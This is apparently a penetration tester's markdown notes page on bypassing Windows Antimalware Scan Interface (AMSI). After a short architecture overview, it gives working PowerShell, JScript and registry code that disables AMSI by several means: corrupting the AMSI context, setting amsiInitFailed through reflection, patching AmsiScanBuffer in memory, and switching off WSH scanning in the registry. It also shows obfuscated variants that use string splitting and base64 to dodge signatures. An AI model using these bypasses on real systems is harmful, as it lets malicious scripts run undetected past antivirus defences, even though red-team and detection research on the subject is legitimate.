---
tags:
  - AMSI_Bypass
  - Advanced
  - Code_Injection
  - Defense_Evasion
  - PowerShell
  - Windows
---

## AMSI Bypass
resources: [Microsoft AMSI Documentation](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)

> [!info] Antimalware Scan Interface (**AMSI**) allows applications to request malware scans. PowerShell, JScript, VBScript send content to AMSI before execution.

### Understanding AMSI

#### AMSI Architecture
> - **amsi.dll** - Core AMSI library loaded into process
> - **AmsiScanBuffer** - Function that scans content
> - **AmsiScanString** - Scans string content
> - **AmsiInitialize** - Initializes AMSI context

#### AMSI Flow
> [!info] AMSI execution flow:
> 1. PowerShell loads amsi.dll
> 2. AmsiInitialize creates context
> 3. Before executing script, AmsiScanBuffer is called
> 4. AV provider (Defender) scans content
> 5. Returns AMSI_RESULT (clean, detected, etc.)

### Bypassing AMSI with Reflection

#### Context Corruption Method
> [!tip] Corrupt AMSI context to make scans fail.

```powershell
$a = [Ref].Assembly.GetTypes() | ForEach-Object { if ($_.Name -like "*iUtils") { $_ } }
$b = $a.GetFields('NonPublic,Static') | ForEach-Object { if ($_.Name -like "*Context") { $_ } }
$c = $b.GetValue($null)
[IntPtr]$ptr = $c
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

#### Attacking Initialization
> [!tip] Set **amsiInitFailed** to true so AMSI never initializes.

```powershell
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*InitFailed" }
$b.SetValue($null, $true)
```

### Patching AMSI in PowerShell

#### AmsiScanBuffer Patch
> [!danger] Overwrite **AmsiScanBuffer** to always return clean result.

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

#### One-Liner AMSI Bypass [alternative]
```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

#### Matt Graeber's Bypass
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Bypassing AMSI in JScript

#### Registry Key Method
> [!tip] AMSI can be disabled via registry for WSH.

```cmd
reg add "HKCU\Software\Microsoft\Windows Script\Settings" /v AmsiEnable /t REG_DWORD /d 0 /f
```

#### WScript AMSI Bypass
> [!tip] COM object instantiation before AMSI initialization.

```javascript
var sh = new ActiveXObject('WScript.Shell');
sh.RegWrite('HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable', 0, 'REG_DWORD');
// Now execute payload
```

### Obfuscating AMSI Bypasses

#### String Concatenation
```powershell
$a = "Sy" + "stem.Man" + "agement.Auto" + "mation.Am" + "siUt" + "ils"
$b = "am" + "siIn" + "itFa" + "iled"
[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
```

#### Base64 Encoding
```powershell
$encoded = "U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="
$type = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
```
